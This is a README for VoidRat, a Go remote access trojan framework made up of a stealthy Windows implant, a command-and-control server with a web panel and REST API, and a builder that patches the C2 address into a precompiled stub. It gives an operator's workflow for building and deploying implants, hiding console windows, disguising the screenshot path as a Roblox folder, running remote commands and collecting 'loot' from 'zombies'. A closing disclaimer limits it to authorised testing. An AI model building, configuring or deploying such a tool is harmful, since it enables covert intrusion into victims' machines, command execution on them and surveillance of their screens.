# VoidRat ⚡

<p align="center">
  <img src="https://img.shields.io/badge/Go-1.21+-00ADD8?style=flat&logo=go" alt="Go Version">
  <img src="https://img.shields.io/badge/Platform-Windows%20(Client)%20%7C%20Linux%20%7C%20macOS-blue" alt="Platform">
  <img src="https://img.shields.io/badge/Architecture-amd64-orange" alt="Architecture">
  <img src="https://img.shields.io/badge/License-MIT-green" alt="License">
</p>

A lightweight, modular Remote Access & Administration Tool (RAT) framework written in Go. **VoidRat** decouples payload compilation from configuration by employing a binary trailing injection technique: a pre-compiled Windows GUI stub is patched with target C2 connection metadata at build-time in milliseconds, without requiring the Go compiler on the operator's machine.

---

## 📑 Table of Contents

- [Features](#-features)
- [Architecture & Protocol](#-architecture--protocol)
  - [Binary Configuration Layout](#binary-configuration-layout)
  - [Communication Protocol](#communication-protocol)
- [Repository Structure](#-repository-structure)
- [Quick Start](#-quick-start)
  - [Prerequisites](#prerequisites)
  - [1. Build the Components](#1-build-the-components)
  - [2. Start the C2 Server](#2-start-the-c2-server)
  - [3. Generate a Configured Client](#3-generate-a-configured-client)
- [C2 Server API Reference](#-c2-server-api-reference)
- [Web Dashboard](#-web-dashboard)
- [Testing](#-testing)
- [Security Disclaimer](#-security-disclaimer)

---

## 🚀 Features

- **Trailing Binary Patching (Zero Recompilation)**: Configures implants in milliseconds by appending a 6-byte metadata footer to the pre-built `client.stub`. No toolchain needed to produce new payloads.
- **Stealth Windows Client**:
  - Compiles as a GUI subsystem application (`-H=windowsgui`) to suppress terminal/console popups.
  - Stripped debug symbols and DWARF tables (`-s -w`) for reduced binary footprint.
  - Disguised screen capture staging path (`%APPDATA%\roblox\screenshot.png`).
- **Resilient Auto-Reconnection**: Built-in exponential retry loop (`RetryAttempts = 20`, `RetryInterval = 10s`) ensuring implants automatically re-establish contact if the C2 listener restarts.
- **Dynamic Multi-Listener C2**: Start, monitor, and stop TCP listeners on arbitrary ports on the fly.
- **Remote Command Execution**: Execute system commands and shell utilities interactively across connected implants.
- **Remote Screen Capture**: Real-time display capture streamed directly back to the C2 server and archived in `loot/`.
- **Integrated Web Control Panel & REST API**: Manage all listeners, clients ("zombies"), commands, and loot through an interactive web UI or scriptable HTTP REST endpoints.

---

## 🛠 Architecture & Protocol

```
                        ┌───────────────────────────────┐
                        │      VoidRat C2 Server        │
                        │  - HTTP API / Web UI (:2560)  │
                        │  - Dynamic TCP Listeners      │
                        └───────────────┬───────────────┘
                                        │
                         TCP Connection │ (JSON Commands / Streams)
                                        │
                        ┌───────────────▼───────────────┐
                        │    VoidRat Client Implant     │
                        │   (Windows amd64 GUI Stub)    │
                        └───────────────▲───────────────┘
                                        │
                         6-Byte Trailing│ Injection
                                        │
                        ┌───────────────┴───────────────┐
                        │        VoidRat Builder        │
                        │ (Patches Port & IP into Stub) │
                        └───────────────────────────────┘
```

### Binary Configuration Layout

When the implant starts, it inspects its own binary on disk and reads the trailing 6 bytes:

```
+------------------------------------------+--------------------+-------------------+
|            Base PE Executable            | 2 Bytes: Port      | 4 Bytes: IPv4     |
|              (client.stub)               | (Little-Endian)    | (Network Octets)  |
+------------------------------------------+--------------------+-------------------+
 [0 .............................. len - 7]   [len - 6 : len - 4] [len - 4 : len]
```

- **Bytes `[len-6 : len-4]`**: 16-bit unsigned integer representing the C2 TCP port in Little-Endian byte order.
- **Bytes `[len-4 : len]`**: 4 raw bytes representing the C2 IPv4 address (e.g., `192.168.1.100` -> `0xC0 0xA8 0x01 0x64`).
- **Development Fallback**: If the stub is executed unpatched or in local testing, it automatically checks environment variables (`VOIDRAT_HOST` and `VOIDRAT_PORT`), falling back to `127.0.0.1:4444`.

### Communication Protocol

Communication takes place over a raw TCP socket using newline-delimited JSON commands:

| Command Type | Payload Example | Client Action |
| :--- | :--- | :--- |
| `remote` | `{"type":"remote","command":"whoami"}\n` | Executes command via shell/process and returns immediately. |
| `screenshot` | `{"type":"screenshot"}\n` | Captures primary display, writes to disguise path, transmits 1-byte path length + path string + raw PNG bytes until `IEND` trailer. |
| `audio` | `{"type":"audio"}\n` | Reserved for future audio streaming module. |

---

## 📂 Repository Structure

```
VoidRat/
├── Makefile             # Convenient build automation for all targets
├── .gitignore           # Ignores binaries, IDE configs, loot, and OS files
├── client/              # Windows implant source code
│   ├── main.go          # Core implant logic & command handler
│   ├── client.stub      # Base pre-compiled Windows amd64 GUI binary
│   ├── build.bat        # Windows batch build script
│   ├── build.sh         # Cross-platform bash build script
│   └── go.mod           # Client Go module dependencies
├── server/              # C2 server implementation
│   ├── main.go          # HTTP API, TCP listener manager & Web UI
│   ├── server_test.go   # Automated unit and API tests
│   └── go.mod           # Server Go module
├── builder/             # Standalone payload generator
│   ├── main.go          # CLI binary patching utility
│   ├── builder_test.go  # Unit tests for injection/extraction logic
│   └── go.mod           # Builder Go module
└── test/                # Mock API server for testing & development
    ├── test.go
    └── go.mod
```

---

## ⚡ Quick Start

### Prerequisites

- [Go](https://go.dev/dl/) 1.21 or newer installed.
- (Optional) `make` installed.

### 1. Build the Components

Using `make`:
```bash
# Build server and builder utilities
make server builder

# (Optional) Rebuild client.stub for Windows
make stub
```

Or build manually using the Go toolchain:
```bash
# Build C2 Server
cd server && go build -o ../bin/server . && cd ..

# Build Payload Builder
cd builder && go build -o ../bin/builder . && cd ..

# (Optional) Cross-compile fresh Windows client stub
cd client
GOOS=windows GOARCH=amd64 go build -ldflags "-H=windowsgui -s -w" -o client.stub .
cd ..
```

### 2. Start the C2 Server

Run the server on the default HTTP port (`2560`) and optionally start an initial TCP listener (e.g., port `4444`):

```bash
./bin/server -port 2560 -listen 4444
```

Output:
```
2026/09/25 05:30:00 [+] TCP Listener started on port :4444
2026/09/25 05:30:00 [*] VoidRat C2 Server listening on HTTP http://127.0.0.1:2560
2026/09/25 05:30:00 [*] Open http://127.0.0.1:2560 in your browser for the Web Control Panel
```

### 3. Generate a Configured Client

Use the `builder` tool to create a configured `.exe` pointing to your C2 IP and port:

```bash
./bin/builder -ip 192.168.1.100 -port 4444 -stub client/client.stub -out dist/client.exe
```

Output:
```
[+] Configured client payload generated successfully!
    Target C2 Address : 192.168.1.100:4444
    Base Stub File    : client/client.stub (3901440 bytes)
    Output Executable : dist/client.exe (3901446 bytes)
[+] Ready for deployment.
```

---

## 📡 C2 Server API Reference

The C2 server exposes a REST API on `:2560`:

### `POST /newListener`
Spawns a new TCP listener on the specified port.
```bash
curl -X POST http://127.0.0.1:2560/newListener \
  -H "Content-Type: application/json" \
  -d '{"port": 5555}'
```

### `GET /getListeners`
Returns a list of all active listener ports.
```bash
curl http://127.0.0.1:2560/getListeners
```
*Response:* `{"listeners": [4444, 5555]}`

### `POST /stopListener`
Closes an active TCP listener.
```bash
curl -X POST http://127.0.0.1:2560/stopListener \
  -H "Content-Type: application/json" \
  -d '{"port": 5555}'
```

### `GET /getZombies`
Lists all currently connected implants.
```bash
curl http://127.0.0.1:2560/getZombies
```
*Response:* `[{"id": 1, "remoteAddr": "192.168.1.50:51234", "connectedAt": "2026-09-25T05:30:00Z"}]`

### `POST /runCommand`
Dispatches a command to a specific implant.
```bash
curl -X POST http://127.0.0.1:2560/runCommand \
  -H "Content-Type: application/json" \
  -d '{"id": 1, "command": "whoami"}'
```

### `POST /screenshot`
Requests a screenshot from the implant. The server receives and saves the image to `loot/screenshot_zombie<id>_<timestamp>.png`.
```bash
curl -X POST http://127.0.0.1:2560/screenshot \
  -H "Content-Type: application/json" \
  -d '{"id": 1}'
```

### `POST /removeZombie`
Disconnects and removes an implant session.
```bash
curl -X POST http://127.0.0.1:2560/removeZombie \
  -H "Content-Type: application/json" \
  -d '{"id": 1}'
```

---

## 🖥 Web Dashboard

Navigate to `http://127.0.0.1:2560/` in any modern web browser to access the built-in dark mode dashboard:

- **Live Listener Management**: Add and tear down listeners with a single click.
- **Zombies Overview**: View connected hosts, IP addresses, and connection uptime in real-time.
- **Action Triggers**: Execute shell commands, capture screens, or terminate connections via UI prompts.
- **Activity Log**: Real-time event log tracking listener status and command dispatch.

---

## 🧪 Testing

Run the automated test suite across all modules:

```bash
make test
```

Or test individual modules:
```bash
cd builder && go test -v .
cd ../server && go test -v .
```

---

## ⚠️ Security Disclaimer

This software is provided for **educational purposes and authorized security research / penetration testing only**. The authors and contributors assume no liability and are not responsible for any misuse or damage caused by this program. Only deploy and execute this software on systems you own or have explicit written permission to assess.
